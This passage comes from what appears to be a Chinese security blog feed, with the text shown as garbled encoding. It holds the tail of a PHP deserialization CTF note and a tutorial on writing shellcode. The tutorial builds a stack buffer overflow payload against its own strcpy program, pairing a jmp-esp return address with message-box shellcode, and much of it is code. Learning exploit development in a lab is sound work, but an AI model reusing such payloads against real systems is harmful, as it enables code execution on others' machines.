ï¼Œå¯ä»¥ç”¨æ¥ç»•è¿‡æ­£åˆ™åŒ¹é…</li><li>ç»•è¿‡<code>__wakeup()</code>ï¼Œè¿™é‡Œå°±å¯ä»¥åˆ©ç”¨<code>CVE-2016-7124</code>çš„æ¼æ´ï¼š<font color="red">å³å½“åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶ä¼šè·³è¿‡<code>__wakeup</code>çš„æ‰§è¡Œ</font></li><li>ç§æœ‰å±æ€§(<code>private</code>)åˆ—åŒ–åï¼Œ ä¼šåœ¨å±æ€§åå‰åŠ ä¸Šç±»åï¼Œç±»åçš„å·¦å³ä¼šåŠ æœ‰<code>%00</code></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;é¢˜ç›®&quot;&gt;&lt;a href=&quot;#é¢˜ç›®&quot; class=&quot;headerlink&quot; title=&quot;é¢˜ç›®&quot;&gt;&lt;/a&gt;é¢˜ç›®&lt;/h2&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span cl</summary>
      
    
    
    
    <category term="ç½‘ç»œå®‰å…¨" scheme="https://taonn.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="CTF" scheme="https://taonn.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>shellcodeç¼–å†™(ä¸‰)</title>
    <link href="https://taonn.github.io/2020/10/06/shellcode%E7%BC%96%E5%86%99-%E4%B8%89/"/>
    <id>https://taonn.github.io/2020/10/06/shellcode%E7%BC%96%E5%86%99-%E4%B8%89/</id>
    <published>2020-10-06T00:31:03.000Z</published>
    <updated>2021-03-16T05:28:48.611Z</updated>
    
    <content type="html"><![CDATA[<p>åˆ‡å…¥æ­£é¢˜ï¼Œè¿™æ¬¡æˆ‘ä»¬è¿›è¡Œshellcodeç¼–å†™ï¼Œåªæ˜¯åŸºç¡€çš„ç¼–å†™ï¼Œä¸ä¼šæ¶‰åŠçš„å¤ªå¤æ‚ï¼Œæˆ‘ä»¬è¿™æ¬¡ç¼–å†™çš„shellcodeå°±æ˜¯è®©ç¨‹åºè‡ªåŠ¨å¼¹å‡ºä¸€ä¸ªå¯¹è¯æ¡†ï¼Œæˆ‘è¿™é‡Œä½¿ç”¨çš„cè¯­è¨€ä¸­çš„<code>MessageBox()</code>è¿™ä¸ªå‡½æ•°æ¥è¿›è¡Œç¼–å†™ã€‚</p><p>æˆ‘ä»¬é¦–å…ˆéœ€è¦åšçš„å°±æ˜¯è·å–è°ƒç”¨<code>MessageBox()</code>è¿™ä¸ªå‡½æ•°çš„API.æ‰€ä»¥è¯´ï¼Œæˆ‘ä»¬å°±éœ€è¦è·å–è¯¥å‡½æ•°çš„åœ°å€</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*MYPROC)</span><span class="params">(LPTSTR)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">        HINSTANCE LibHandle;</span><br><span class="line">        MYPROC ProcAdd;</span><br><span class="line">        LibHandle = LoadLibrary(<span class="string">&quot;user32&quot;</span>);</span><br><span class="line">        <span class="comment">//è·å–user32.dllçš„åœ°å€</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;user32 = 0x%x\n&quot;</span>, LibHandle);</span><br><span class="line">        <span class="comment">//è·å–MessageBoxAçš„åœ°å€</span></span><br><span class="line">        ProcAdd=(MYPROC)GetProcAddress(LibHandle,<span class="string">&quot;MessageBoxA&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;MessageBoxA = 0x%x\n&quot;</span>, ProcAdd);</span><br><span class="line">getchar();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œç»“æœå¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20200118143415777.png" alt="image-20200118143415777"></p><p><code>MessageBox()</code>å‡½æ•°åœ¨æˆ‘ä»¬ç³»ç»Ÿä¸­çš„åœ°å€ä¸º<code>0x77d507ea</code>         å½“ç„¶è¿™ä¸ªåœ°å€åœ¨ä¸åŒçš„ç³»ç»Ÿä¸­ï¼Œåº”è¯¥æ˜¯ä¸åŒçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨ç¼–å†™ShellCodeä¹‹å‰ï¼Œä¸€å®šè¦å…ˆæŸ¥æ‰¾æ‰€è¦è°ƒç”¨çš„APIå‡½æ•°çš„åœ°å€ ï¼Œç”±äºæˆ‘ä»¬åˆ©ç”¨æº¢å‡ºæ“ä½œç ´åäº†åŸæœ¬çš„æ ˆç©ºé—´çš„å†…å®¹ï¼Œè¿™å°±å¯èƒ½ä¼šåœ¨æˆ‘ä»¬çš„å¯¹è¯æ¡†æ˜¾ç¤ºå®Œåï¼Œå¯¼è‡´ç¨‹åºå´©æºƒï¼Œæ‰€ä»¥ä¸ºäº†è°¨æ…èµ·è§ï¼Œæˆ‘ä»¬è¿™é‡Œè¿˜éœ€è¦ä½¿ç”¨ExitProcess()å‡½æ•°æ¥ä»¤ç¨‹åºç»ˆæ­¢ã€‚è¿™ä¸ªå‡½æ•°ä½äºkernel32.dllé‡Œé¢ï¼Œæ‰€ä»¥è¿™é‡ŒåŒæ ·å¯ä»¥ä½¿ç”¨ä¸Šè¿°ç¨‹åºè¿›è¡Œå‡½æ•°åœ°å€çš„æŸ¥æ‰¾ï¼Œåªè¦ç¨å¾®ä¿®æ”¹ä¸€ä¸‹å°±å¯ä»¥äº†ï¼š </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*MYPROC)</span><span class="params">(LPTSTR)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">        HINSTANCE LibHandle;</span><br><span class="line">        MYPROC ProcAdd;</span><br><span class="line">        LibHandle = LoadLibrary(<span class="string">&quot;kernel32&quot;</span>);  <span class="comment">// è¿™é‡Œ</span></span><br><span class="line">        <span class="comment">//è·å–user32.dllçš„åœ°å€</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;kernel32 = 0x%x\n&quot;</span>, LibHandle);</span><br><span class="line">        <span class="comment">//è·å–MessageBoxAçš„åœ°å€</span></span><br><span class="line">        ProcAdd=(MYPROC)GetProcAddress(LibHandle,<span class="string">&quot;ExitProcess&quot;</span>); <span class="comment">// è¿™é‡Œ</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ExitProcess = 0x%x\n&quot;</span>, ProcAdd);</span><br><span class="line">getchar();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœå¦‚ä¸‹:</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20200118143722638.png" alt="image-20200118143722638"></p><p><code>ExitProcess()</code>åœ°å€æ˜¯<code>0x7c81cafa</code></p><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°±å¼€å§‹ç¼–å†™æ±‡ç¼–ä»£ç ã€‚</p><p>  åœ¨æ±‡ç¼–è¯­è¨€ä¸­ï¼Œæƒ³è°ƒç”¨æŸä¸ªå‡½æ•°ï¼Œæ˜¯éœ€è¦ä½¿ç”¨CALLè¯­å¥çš„ï¼Œè€Œåœ¨CALLè¯­å¥çš„åé¢ï¼Œéœ€è¦è·Ÿä¸Šè¯¥å‡½æ•°åœ¨ç³»ç»Ÿä¸­çš„åœ°å€ã€‚å› ä¸ºæˆ‘åˆšæ‰å·²ç»è·å–åˆ°äº†<code>MessageBox()</code>ä¸<code>ExitProcess()</code>å‡½æ•°çš„åœ°å€ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨è¿™é‡Œå°±å¯ä»¥é€šè¿‡CALLç›¸åº”çš„åœ°å€çš„æ–¹æ³•æ¥è°ƒç”¨ç›¸åº”çš„å‡½æ•°ã€‚ä½†æ˜¯å®é™…ä¸Šï¼Œæˆ‘ä»¬åœ¨ç¼–ç¨‹çš„æ—¶å€™ï¼Œä¸€èˆ¬è¿˜æ˜¯å…ˆå°†åœ°å€èµ‹ç»™è¯¸å¦‚eaxè¿™æ ·çš„å¯„å­˜å™¨ï¼Œç„¶åå†CALLç›¸åº”çš„å¯„å­˜å™¨ï¼Œä»è€Œå®ç°è°ƒç”¨çš„  ã€‚</p><p>å¦‚æœè¯´æˆ‘ä»¬æƒ³è¦è°ƒç”¨çš„å‡½æ•°è¿˜åŒ…å«æœ‰å‚æ•°ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦å…ˆå°†å‚æ•°åˆ©ç”¨PUSHè¯­å¥ä»å³è‡³å·¦åˆ†åˆ«å…¥æ ˆï¼Œä¹‹åå†è°ƒç”¨CALLè¯­å¥ã€‚æ¯”å¦‚ç°åœ¨æœ‰ä¸€ä¸ª<code>Function(a,b,c)</code>å‡½æ•°ï¼Œæˆ‘ä»¬æƒ³è°ƒç”¨å®ƒï¼Œé‚£ä¹ˆå®ƒçš„æ±‡ç¼–ä»£ç å°±åº”è¯¥ç¼–å†™ä¸ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">push c</span><br><span class="line">push b</span><br><span class="line">push a</span><br><span class="line">mov eax,Addrssfunction</span><br><span class="line">call eax</span><br></pre></td></tr></table></figure><p>æ ¹æ®è¿™ä¸ªæ€æƒ³ï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨VC++ä¸­åˆ©ç”¨å†…è”æ±‡ç¼–æ¥è°ƒç”¨<code> ExitProcess()</code>è¿™ä¸ªå‡½æ•°ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">xor ebx,ebx # ebx &#x3D; 0</span><br><span class="line">push ebx</span><br><span class="line">mov eax, 0x7c81cafa</span><br><span class="line">call eax</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ç¼–å†™MessageBox()è¿™ä¸ªå‡½æ•°è°ƒç”¨ã€‚ä¸ä¸Šä¸€ä¸ªå‡½æ•°ä¸åŒçš„æ˜¯ï¼Œè¿™ä¸ªAPIå‡½æ•°åŒ…å«æœ‰å››ä¸ªå‚æ•°ï¼Œå½“ç„¶ç¬¬ä¸€å’Œç¬¬å››ä¸ªå‚æ•°ï¼Œæˆ‘ä»¬å¯ä»¥èµ‹ç»™0å€¼ï¼Œä½†æ˜¯ä¸­é—´ä¸¤ä¸ªå‚æ•°éƒ½åŒ…å«æœ‰è¾ƒé•¿çš„å­—ç¬¦ä¸²ï¼Œè¿™æ—¶å€™å°±è¦æŠŠæ‰€éœ€è¦ç”¨åˆ°çš„å­—ç¬¦ä¸²è½¬æ¢ä¸ºASCIIç å€¼ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># ç„¶åå°†æ¯å››ä¸ªå­—ç¬¦ä¸ºä¸€ç»„ï¼Œè¿›è¡Œåˆ†ç»„ï¼Œå°†ä¸æ»¡å››ä¸ªå­—ç¬¦çš„ï¼Œä»¥ç©ºæ ¼ï¼ˆx20ï¼‰è¿›è¡Œå¡«å……</span><br><span class="line">warning:</span><br><span class="line">\x57\x61\x72\x6e</span><br><span class="line">\x69\x6e\x67\x20</span><br><span class="line">You have been hacked!(by Taoy):</span><br><span class="line">\x59\x6f\x75\x20</span><br><span class="line">\x68\x61\x76\x65</span><br><span class="line">\x20\x62\x65\x65</span><br><span class="line">\x6e\x20\x68\x61</span><br><span class="line">\x63\x6b\x65\x64</span><br><span class="line">\x21\x28\x62\x79</span><br><span class="line">\x20\x54\x61\x6f</span><br><span class="line">\x79\x29\x20\x20</span><br></pre></td></tr></table></figure><p>â€‹         è¿™é‡Œä¹‹æ‰€ä»¥éœ€è¦ä»¥x20è¿›è¡Œå¡«å……ï¼Œè€Œä¸æ˜¯x00è¿›è¡Œå¡«å……ï¼Œå°±æ˜¯å› ä¸ºæˆ‘ä»¬ç°åœ¨æ‰€åˆ©ç”¨çš„æ˜¯strcpyçš„æ¼æ´ï¼Œè€Œè¿™ä¸ªå‡½æ•°åªè¦ä¸€é‡åˆ°x00å°±ä¼šè®¤ä¸ºæˆ‘ä»¬çš„å­—ç¬¦ä¸²ç»“æŸäº†ï¼Œå°±ä¸ä¼šå†æ‹·è´x00åçš„å†…å®¹äº†  </p><p>  ç”±äºæˆ‘ä»¬çš„è®¡ç®—æœºæ˜¯å°ç«¯æ˜¾ç¤ºï¼Œå› æ­¤å­—ç¬¦çš„è¿›å±•é¡ºåºæ˜¯ä»åå¾€å‰ä¸æ–­è¿›æ ˆçš„ï¼Œå³Warningçš„è¿›æ ˆé¡ºåºä¸ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push 0x20676e69</span><br><span class="line">push 0x6e726157 &#x2F;&#x2F; push &quot;Warning&quot;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¦‚ä½•è·å–è¿™ä¸¤ä¸ªå­—ç¬¦ä¸²çš„åœ°å€ ? æˆ‘ä»¬å¯ä»¥åˆ©ç”¨espæŒ‡é’ˆï¼Œå› ä¸ºespå§‹ç»ˆæŒ‡å‘æ ˆé¡¶çš„ä½ç½®ï¼Œæ‰€ä»¥æˆ‘ä»¬å°†å­—ç¬¦å‹å…¥æ ˆä»¥åï¼Œå°†espçš„å€¼èµ‹ç»™åˆ«çš„ç›¸åº”çš„å¯„å­˜å™¨å³å¯<code>mov eax,esp</code> æˆ– <code>mov ebx,esp</code></p><p>å¦‚æ­¤ï¼Œæˆ‘ä»¬åœ¨è¿›è¡Œå‡½æ•°çš„è°ƒç”¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">push ebx</span><br><span class="line">push eax</span><br><span class="line">push ecx</span><br><span class="line">push ebx</span><br><span class="line">mov eax, 0x77d507ea</span><br><span class="line">call eax &#x2F;&#x2F; call MessageBox</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å°†ä»£ç å†™å…¥vc6.0++, å®Œæ•´ä»£ç å¦‚ä¸‹:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">_asm&#123;</span><br><span class="line">sub esp,<span class="number">0x50</span></span><br><span class="line"><span class="keyword">xor</span> ebx,ebx</span><br><span class="line">push ebx     <span class="comment">// cut string</span></span><br><span class="line">push <span class="number">0x20676e69</span>   </span><br><span class="line">push <span class="number">0x6e726157</span>    <span class="comment">// push &quot;Warning&quot;</span></span><br><span class="line">mov eax,esp</span><br><span class="line">push ebx             <span class="comment">// cut string  </span></span><br><span class="line">push <span class="number">0x20202979</span></span><br><span class="line">push <span class="number">0x6f615420</span></span><br><span class="line">push <span class="number">0x79622821</span></span><br><span class="line">push <span class="number">0x64656b63</span></span><br><span class="line">push <span class="number">0x6168206e</span></span><br><span class="line">push <span class="number">0x65656220</span></span><br><span class="line">push <span class="number">0x65766168</span></span><br><span class="line">push <span class="number">0x20756f59</span>    <span class="comment">// push &quot;You have been hacked!(by Taoy)&quot;</span></span><br><span class="line">mov ecx,esp        </span><br><span class="line"></span><br><span class="line">push ebx</span><br><span class="line">push eax</span><br><span class="line">push ecx</span><br><span class="line">push ebx</span><br><span class="line">mov eax,<span class="number">0x77d507ea</span></span><br><span class="line">call eax           <span class="comment">// call MessageBox</span></span><br><span class="line">push ebx</span><br><span class="line">mov eax, <span class="number">0x7c81cafa</span></span><br><span class="line">call eax            <span class="comment">// call ExitProcess</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬é€šè¿‡è°ƒè¯•æ¥æå–shellcode.</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20200118150649315.png" alt="image-20200118150649315"></p><p>æŒ‰ä¸‹<code>F9</code>å·¦ä¾§æœ‰ä¸ªçº¢è‰²çš„åœ†åœˆå‡ºç°åï¼Œç„¶åæŒ‰<code>F5</code>è¿›å…¥è°ƒè¯•ï¼Œç„¶å<code>alt + 8</code>,æ˜¾ç¤ºæœºå™¨ç </p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20200118150848143.png" alt="image-20200118150848143"></p><p>å°†è¿™ä¸ªæ±‡ç¼–æŒ‡ä»¤è½¬æ¢çš„æœºå™¨ç æå–å‡ºæ¥å³å¯,æå–å®Œæœºå™¨ç , å®Œæ•´çš„shellcodeä»¥åŠç¨‹åºä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">char name[] &#x3D;</span><br><span class="line">&quot;\x41\x41\x41\x41\x41\x41\x41\x41&quot; &#x2F;&#x2F;name[0]~name[7]</span><br><span class="line">&quot;\x42\x42\x42\x42&quot;&#x2F;&#x2F;EBP</span><br><span class="line">&quot;\x79\x5b\xe3\x77&quot;&#x2F;&#x2F;ReturnAddress</span><br><span class="line">&quot;\x83\xEC\x50&quot;&#x2F;&#x2F;subesp,0x50</span><br><span class="line">&quot;\x33\xDB&quot;&#x2F;&#x2F;xorebx,ebx</span><br><span class="line">&quot;\x53&quot;&#x2F;&#x2F;pushebx</span><br><span class="line">&quot;\x68\x69\x6E\x67\x20&quot;</span><br><span class="line">&quot;\x68\x57\x61\x72\x6E&quot;&#x2F;&#x2F;push&quot;Warning&quot;</span><br><span class="line">&quot;\x8B\xC4&quot;&#x2F;&#x2F;moveax,esp</span><br><span class="line">&quot;\x53&quot;&#x2F;&#x2F;pushebx</span><br><span class="line">&quot;\x68\x79\x29\x20\x20&quot;</span><br><span class="line">&quot;\x68\x20\x54\x61\x6f&quot;</span><br><span class="line">&quot;\x68\x21\x28\x62\x79&quot;</span><br><span class="line">&quot;\x68\x63\x6B\x65\x64&quot;</span><br><span class="line">&quot;\x68\x6E\x20\x68\x61&quot;</span><br><span class="line">&quot;\x68\x20\x62\x65\x65&quot;</span><br><span class="line">&quot;\x68\x68\x61\x76\x65&quot;</span><br><span class="line">&quot;\x68\x59\x6F\x75\x20&quot;&#x2F;&#x2F;push&quot;Youhavebeenhacked!(byJ.Y.)&quot;</span><br><span class="line">&quot;\x8B\xCC&quot;&#x2F;&#x2F;movecx,esp</span><br><span class="line">&quot;\x53&quot;&#x2F;&#x2F;pushebx</span><br><span class="line">&quot;\x50&quot;&#x2F;&#x2F;pusheax</span><br><span class="line">&quot;\x51&quot;&#x2F;&#x2F;pushecx</span><br><span class="line">&quot;\x53&quot;&#x2F;&#x2F;pushebx</span><br><span class="line">&quot;\xB8\xea\x07\xd5\x77&quot;</span><br><span class="line">&quot;\xFF\xD0&quot;&#x2F;&#x2F;callMessageBox</span><br><span class="line">&quot;\x53&quot;</span><br><span class="line">&quot;\xB8\xFA\xCA\x81\x7C&quot;</span><br><span class="line">&quot;\xFF\xD0&quot;;</span><br></pre></td></tr></table></figure><p>ç”±äºæˆ‘ä»¬è¿™é‡Œè°ƒç”¨äº†MessageBoxï¼Œå› æ­¤éœ€è¦åœ¨æºç¨‹åºä¸­åŠ å…¥LoadLibrary(â€œuser32.dllâ€);è¿™æ¡è¯­å¥ç”¨äºåŠ è½½ç›¸åº”çš„åŠ¨æ€é“¾æ¥åº“ï¼Œè€Œç”±äºä½¿ç”¨äº†<code>LoadLibrary()</code>ï¼Œè¿˜éœ€è¦åŠ å…¥<code>windows.h</code>è¿™ä¸ªå¤´æ–‡ä»¶ã€‚</p><p>æ­¤æ—¶ä»£ç ä¸ºï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> name[] =</span><br><span class="line"><span class="string">&quot;\x41\x41\x41\x41\x41\x41\x41\x41&quot;</span> <span class="comment">//name[0]~name[7]</span></span><br><span class="line"><span class="string">&quot;\x42\x42\x42\x42&quot;</span><span class="comment">//EBP</span></span><br><span class="line"><span class="string">&quot;\x79\x5b\xe3\x77&quot;</span><span class="comment">//ReturnAddress</span></span><br><span class="line"><span class="string">&quot;\x83\xEC\x50&quot;</span><span class="comment">//subesp,0x50</span></span><br><span class="line"><span class="string">&quot;\x33\xDB&quot;</span><span class="comment">//xorebx,ebx</span></span><br><span class="line"><span class="string">&quot;\x53&quot;</span><span class="comment">//pushebx</span></span><br><span class="line"><span class="string">&quot;\x68\x69\x6E\x67\x20&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x57\x61\x72\x6E&quot;</span><span class="comment">//push&quot;Warning&quot;</span></span><br><span class="line"><span class="string">&quot;\x8B\xC4&quot;</span><span class="comment">//moveax,esp</span></span><br><span class="line"><span class="string">&quot;\x53&quot;</span><span class="comment">//pushebx</span></span><br><span class="line"><span class="string">&quot;\x68\x79\x29\x20\x20&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x20\x54\x61\x6f&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x21\x28\x62\x79&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x63\x6B\x65\x64&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x6E\x20\x68\x61&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x20\x62\x65\x65&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x68\x61\x76\x65&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x59\x6F\x75\x20&quot;</span><span class="comment">//push&quot;Youhavebeenhacked!(by Taoy)&quot;</span></span><br><span class="line"><span class="string">&quot;\x8B\xCC&quot;</span><span class="comment">//movecx,esp</span></span><br><span class="line"><span class="string">&quot;\x53&quot;</span><span class="comment">//pushebx</span></span><br><span class="line"><span class="string">&quot;\x50&quot;</span><span class="comment">//pusheax</span></span><br><span class="line"><span class="string">&quot;\x51&quot;</span><span class="comment">//pushecx</span></span><br><span class="line"><span class="string">&quot;\x53&quot;</span><span class="comment">//pushebx</span></span><br><span class="line"><span class="string">&quot;\xB8\xea\x07\xd5\x77&quot;</span></span><br><span class="line"><span class="string">&quot;\xFF\xD0&quot;</span><span class="comment">//callMessageBox</span></span><br><span class="line"><span class="string">&quot;\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\xB8\xFA\xCA\x81\x7C&quot;</span></span><br><span class="line"><span class="string">&quot;\xFF\xD0&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buffer[<span class="number">8</span>];</span><br><span class="line">LoadLibrary(<span class="string">&quot;user32.dll&quot;</span>); <span class="comment">// åŠ è½½ user32.dll åŠ¨æ€é“¾æ¥åº“</span></span><br><span class="line"><span class="built_in">strcpy</span>(buffer, name);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,buffer);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åè¿è¡Œç¨‹åºï¼Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬å·²ç»æˆåŠŸåˆ©ç”¨äº†æ¼æ´ï¼š</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20200118153644848.png" alt="image-20200118153644848"></p><p>æˆ‘ä»¬æ¥ä¸‹æ¥ä½¿ç”¨ODè°ƒè¯•ï¼Œä¸€æ­¥ä¸€æ­¥è·Ÿè¿›ï¼Œå‘ç°æŒ‡å‘å®Œ<code>jmp esp</code>ï¼Œè·³è½¬åˆ°äº†æˆ‘ä»¬çš„shellcodeå¤„</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20200118160152832.png" alt="image-20200118160152832"></p><p>æˆ‘ä»¬ç»§ç»­å¾€ä¸‹,ä¸‹å›¾æ˜¾ç¤ºçš„è¿‡ç¨‹å°±æ˜¯æŠŠ<code>MessageBox()</code>å‡½æ•°çš„å‚æ•°å…¥æ ˆï¼Œç„¶åcall è¿™ä¸ªå‡½æ•°</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20200118160255053.png" alt="image-20200118160255053"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20200118160440020.png" alt="image-20200118160440020"></p><p>æœ€åï¼Œæˆ‘ä»¬è§‚å¯Ÿä¸€ä¸‹æ•°æ®ä»¥åŠå †æ 